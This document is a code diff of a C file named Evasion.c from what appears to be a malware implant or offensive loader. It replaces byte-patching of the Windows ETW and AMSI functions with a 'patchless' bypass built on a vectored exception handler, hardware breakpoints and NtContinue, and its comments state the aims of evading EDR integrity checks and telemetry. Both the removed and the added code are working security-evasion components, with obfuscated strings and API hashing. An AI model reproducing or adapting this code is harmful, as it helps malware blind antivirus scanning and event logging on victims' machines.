@@ -1,52 +1,83 @@
 // =============================================
-// Evasion.c - ETW Bypass, AMSI Bypass,
+// Evasion.c - Patchless AMSI/ETW Bypass
+//             (VEH + Hardware Breakpoints + NtContinue)
 //             Anti-Analysis
 // =============================================
 
 #include "Common.h"
 
-// -----------------------------------------------
-// ETW Bypass: Patch EtwEventWrite with xor eax,eax; ret
-// This makes ETW tracing return success without logging
-// -----------------------------------------------
-BOOL PatchEtw(IN PAPI_HASHING pApi) {
+// Global target addresses for VEH handler
+static PVOID g_pEtwEventWrite   = NULL;
+static PVOID g_pAmsiScanBuffer  = NULL;
 
-    // Get ntdll base (deobfuscated)
+// Guard flag: prevents infinite NtContinue loop
+static volatile BOOL g_bHwBpSet = FALSE;
+
+// -----------------------------------------------
+// Vectored Exception Handler
+// Catches STATUS_SINGLE_STEP (hardware breakpoint hit)
+// and makes the target function "return" immediately
+// without writing any bytes to code memory.
+//
+// EDR integrity checks see unmodified ntdll/amsi code.
+// -----------------------------------------------
+static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
+
+    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    PCONTEXT ctx = pExInfo->ContextRecord;
+
+    // EtwEventWrite hit -> return STATUS_SUCCESS (0)
+    if (ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
+        ctx->Rax = 0;
+        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
+        ctx->Rsp += sizeof(ULONG_PTR);
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    // AmsiScanBuffer hit -> return E_INVALIDARG
+    // Callers that check HRESULT will skip the scan result entirely
+    if (ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
+        ctx->Rax = 0x80070057;  // E_INVALIDARG
+        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
+        ctx->Rsp += sizeof(ULONG_PTR);
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+// -----------------------------------------------
+// Patchless AMSI/ETW Bypass
+//
+// Sets hardware breakpoints (DR0/DR1) on EtwEventWrite
+// and AmsiScanBuffer using RtlCaptureContext + NtContinue.
+//
+// NtContinue sets debug registers without ETW-TI
+// telemetry (unlike NtSetContextThread which is logged).
+//
+// VEH handler intercepts the breakpoint exceptions and
+// makes the functions "return" with benign values.
+//
+// Zero bytes of code are modified — fully patchless.
+// -----------------------------------------------
+BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
+
+    // --- Resolve target function addresses ---
+
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
     DEOBF(xNtdll);
     PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
     if (!pNtdll)
         return FALSE;
 
-    // Get EtwEventWrite address (deobfuscated)
     BYTE xEtw[] = XSTR_ETW_EVENT_WRITE;
     DEOBF(xEtw);
-    PBYTE pEtwFunc = (PBYTE)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
-    if (!pEtwFunc)
+    g_pEtwEventWrite = (PVOID)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
+    if (!g_pEtwEventWrite)
         return FALSE;
 
-    // Patch bytes: xor rax, rax (48 31 C0) + ret (C3) - alternate encoding
-    BYTE bPatch[] = { 0x48, 0x31, 0xC0, 0xC3 };
-
-    DWORD dwOldProtection = 0;
-    if (!pApi->pVirtualProtect(pEtwFunc, sizeof(bPatch), PAGE_EXECUTE_READWRITE, &dwOldProtection))
-        return FALSE;
-
-    MemCopy(pEtwFunc, bPatch, sizeof(bPatch));
-
-    DWORD dwDummy = 0;
-    pApi->pVirtualProtect(pEtwFunc, sizeof(bPatch), dwOldProtection, &dwDummy);
-
-    return TRUE;
-}
-
-// -----------------------------------------------
-// AMSI Bypass: Patch AmsiScanBuffer
-// Flips je -> jne to force AMSI_RESULT_CLEAN path
-// -----------------------------------------------
-BOOL PatchAmsi(IN PAPI_HASHING pApi) {
-
-    // Load amsi.dll if not already loaded (deobfuscated)
     BYTE xAmsiDll[] = XSTR_AMSI_DLL;
     DEOBF(xAmsiDll);
     HMODULE hAmsi = pApi->pLoadLibraryA((LPCSTR)xAmsiDll);
@@ -55,22 +86,67 @@ BOOL PatchAmsi(IN PAPI_HASHING pApi) {
 
     BYTE xAmsiFunc[] = XSTR_AMSI_SCAN_BUFFER;
     DEOBF(xAmsiFunc);
-    PBYTE pAmsiScanBuffer = (PBYTE)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
-    if (!pAmsiScanBuffer)
+    g_pAmsiScanBuffer = (PVOID)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
+    if (!g_pAmsiScanBuffer)
         return FALSE;
 
-    // Patch with: xor rax, rax (48 31 C0) + ret (C3) - alternate encoding
-    BYTE bPatch[] = { 0x48, 0x31, 0xC0, 0xC3 };
+    // --- Resolve VEH / Context APIs from ntdll ---
 
-    DWORD dwOldProtection = 0;
-    if (!pApi->pVirtualProtect(pAmsiScanBuffer, sizeof(bPatch), PAGE_EXECUTE_READWRITE, &dwOldProtection))
+    BYTE xVeh[] = XSTR_RTL_ADD_VEH;
+    DEOBF(xVeh);
+    fnRtlAddVectoredExceptionHandler pRtlAddVeh =
+        (fnRtlAddVectoredExceptionHandler)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xVeh);
+    if (!pRtlAddVeh)
         return FALSE;
 
-    MemCopy(pAmsiScanBuffer, bPatch, sizeof(bPatch));
+    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
+    DEOBF(xCapCtx);
+    fnRtlCaptureContext pRtlCaptureCtx =
+        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);
+    if (!pRtlCaptureCtx)
+        return FALSE;
 
-    DWORD dwDummy = 0;
-    pApi->pVirtualProtect(pAmsiScanBuffer, sizeof(bPatch), dwOldProtection, &dwDummy);
+    BYTE xNtCont[] = XSTR_NT_CONTINUE;
+    DEOBF(xNtCont);
+    fnNtContinue pNtContinue =
+        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);
+    if (!pNtContinue)
+        return FALSE;
 
+    // --- Register VEH (first handler in chain) ---
+
+    if (!pRtlAddVeh(1, (PVOID)HwBpVehHandler))
+        return FALSE;
+
+    LOG("[+] Patchless: VEH registered");
+
+    // --- Set hardware breakpoints via RtlCaptureContext + NtContinue ---
+    // RtlCaptureContext captures the current thread context (including RIP).
+    // We modify DR0/DR1/DR7 in the captured context and call NtContinue,
+    // which restores the context with our debug register values and
+    // resumes execution at the instruction after RtlCaptureContext.
+    //
+    // The guard flag g_bHwBpSet prevents the infinite loop:
+    //   1st pass: g_bHwBpSet=FALSE -> set to TRUE, modify ctx, NtContinue
+    //   2nd pass: g_bHwBpSet=TRUE  -> skip, fall through
+
+    CONTEXT ctx;
+    MemSet(&ctx, 0, sizeof(ctx));
+    pRtlCaptureCtx(&ctx);
+
+    if (!g_bHwBpSet) {
+        g_bHwBpSet = TRUE;
+
+        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;     // DR0 = EtwEventWrite
+        ctx.Dr1 = (ULONG_PTR)g_pAmsiScanBuffer;    // DR1 = AmsiScanBuffer
+        ctx.Dr7 = (1 << 0) | (1 << 2);             // L0 + L1: local enable, execute-on-1-byte
+
+        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
+        pNtContinue(&ctx, FALSE);
+        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
+    }
+
+    LOG("[+] Patchless: HW breakpoints set (DR0=ETW, DR1=AMSI)");
     return TRUE;
 }
 
